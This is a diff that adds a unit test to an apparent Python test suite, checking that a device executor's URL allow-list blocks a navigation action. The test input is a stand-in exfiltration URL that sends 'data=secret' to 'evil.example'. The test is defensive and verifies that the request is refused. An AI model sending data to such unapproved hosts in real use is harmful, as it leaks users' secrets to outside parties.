@@ -41,3 +41,12 @@ def test_executor_checks_urls(settings_device):
     )
     assert outcome.executed is False
     assert "scheme" in (outcome.error or "")
+
+
+def test_exfiltration_to_an_unapproved_host_is_blocked(settings_device):
+    executor = DeviceExecutor(settings_device, url_policy=UrlPolicy(["good.example"]))
+    outcome = executor.execute(
+        Action.from_dict({"kind": "web.navigate", "url": "https://evil.example/?data=secret"})
+    )
+    assert outcome.executed is False
+    assert "allow-list" in (outcome.error or "")
